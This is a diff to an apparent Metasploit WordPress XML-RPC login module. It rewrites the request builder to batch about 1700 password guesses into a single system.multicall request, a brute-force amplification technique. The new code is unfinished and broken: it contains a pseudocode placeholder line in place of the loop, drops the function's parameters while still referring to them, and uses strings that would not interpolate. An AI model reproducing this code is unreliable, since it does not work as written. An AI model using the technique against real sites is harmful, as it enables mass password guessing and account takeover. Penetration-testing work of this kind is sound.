@@ -55,16 +55,38 @@ module Metasploit
         # @param user [String] the username to authenticate with
         # @param pass [String] the password to authenticate with
         # @return [String] the generated XML body for the request
-        def generate_xml_request(user, pass)
-          xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
-          xml << '<methodCall>'
-          xml << '<methodName>wp.getUsers</methodName>'
-          xml << '<params><param><value>1</value></param>'
-          xml << "<param><value>#{user}</value></param>"
-          xml << "<param><value>#{pass}</value></param>"
-          xml << '</params>'
-          xml << '</methodCall>'
-          xml
+        def generate_xml_request()
+            # read username from datastore
+            # read 1700 passwords from datastore
+            xml = '<?xml version="1.0"?>'
+            xml << '<methodCall>'
+            xml << '<methodName>system.multicall</methodName>'
+            xml << '<params>'
+            xml << '<param>'
+            xml << '<value><array>'
+            xml << '<data><value>'
+            # for loop datastore password make file with 1700 password attempt lines here'
+            SOME FOR LOOP THNIG IN RUBY TO ITERATE THE 1700 passwords
+              xml << '<struct>'
+              xml << '<member>'
+              xml << '<name>methodName</name>'
+              xml << '<value><string>wp.getAuthors</string></value>'
+              xml << '</member>'
+              xml << '<member>'
+              xml << '<name>params</name>'
+              xml << '<value><array><data>'
+              xml << '<value><string>1</string></value>'
+              xml << '<value><string>#{user}</string></value>'
+              xml << '<value><string>#{pass}</string></value>'
+              xml << '</data></array></value>'
+              xml << '</member>'
+              xml << '</struct>'		
+            xml << '</value></data>'
+            xml << '</array></value>'
+            xml << '</param>'
+            xml << '</params>'
+            xml << '</methodCall>'
+            xml
         end
 
         # (see Base#set_sane_defaults)
